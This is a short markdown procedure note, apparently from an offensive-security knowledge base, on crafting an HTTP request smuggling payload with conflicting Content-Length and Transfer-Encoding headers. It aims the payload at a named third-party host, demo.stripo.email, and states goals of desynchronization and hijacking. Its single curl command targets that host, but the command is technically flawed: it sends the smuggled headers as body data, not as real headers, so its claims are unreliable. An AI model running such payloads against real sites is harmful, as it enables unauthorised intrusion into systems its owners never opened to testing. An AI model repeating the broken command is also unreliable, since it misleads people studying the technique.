---
id: proc-002
tags:
  - http-request-smuggling
  - request-crafting
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-smuggling]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T09:01:21.528Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Smuggling Request

## Summary

This procedure details crafting a malformed HTTP request to exploit smuggling vulnerabilities by combining Content-Length and Transfer-Encoding headers.

## Description

The crafting process involves creating requests that are interpreted differently by servers, allowing smuggling of additional requests. Targeted at demo.stripo.email, this enables potential hijacking.

## Requirements

1. Access to the vulnerable endpoint
2. Tool for manual request editing
3. Knowledge of HTTP headers

## Defense

- Use consistent HTTP parsers across stack
- Rate-limit suspicious requests

## Objectives

1. Create exploitable smuggling payload
2. Test for successful desynchronization
3. Prepare for chaining to hijacking

## Instructions

### Step 1: Build Payload

**Context**: Construct the smuggling request.

**Command** ([[commands/curl-smuggling]]):
```bash
curl -v --data "POST / HTTP/1.1\r\nHost: demo.stripo.email\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: demo.stripo.email\r\n\r\n" https://demo.stripo.email
```

> This embeds a GET request within a POST using conflicting headers.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-smuggling]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[http-request-smuggling]]
- [[request-crafting]]
